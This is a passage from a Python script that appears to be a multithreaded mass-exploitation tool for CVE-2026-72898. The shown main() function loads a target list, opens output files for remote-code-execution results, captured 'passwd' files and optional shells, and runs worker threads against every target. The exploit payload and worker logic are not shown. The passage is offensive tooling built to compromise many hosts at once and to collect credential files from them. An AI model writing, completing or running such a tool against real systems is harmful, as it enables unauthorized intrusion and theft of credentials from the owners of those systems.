        sys.exit("no targets in %s" % opt.listfile)

    if opt.outdir and not os.path.isdir(opt.outdir):
        os.makedirs(opt.outdir)

    sink = Sink(
        os.path.join(opt.outdir, opt.rce_file),
        os.path.join(opt.outdir, opt.passwd_file),
        os.path.join(opt.outdir, opt.shell_file) if opt.shell else None,
        echo=not opt.quiet,
    )

    print("%s | CVE-2026-72898" % TOOL)
    print("targets=%d threads=%d" % (len(targets), opt.threads))
    print("rce      -> %s" % sink.rce_path)
    print("passwd   -> %s" % sink.passwd_path)
    if sink.shell_path:
        print("shell    -> %s" % sink.shell_path)
    print("-" * 60)

    q = Queue.Queue()
    for t in targets:
        q.put(t)
    for _ in range(max(1, min(opt.threads, len(targets)))):
        th = threading.Thread(target=worker, args=(q, opt, sink))
        th.daemon = True
        th.start()
    q.join()
    print("-" * 60)
    print("done.")


if __name__ == "__main__":
    main()
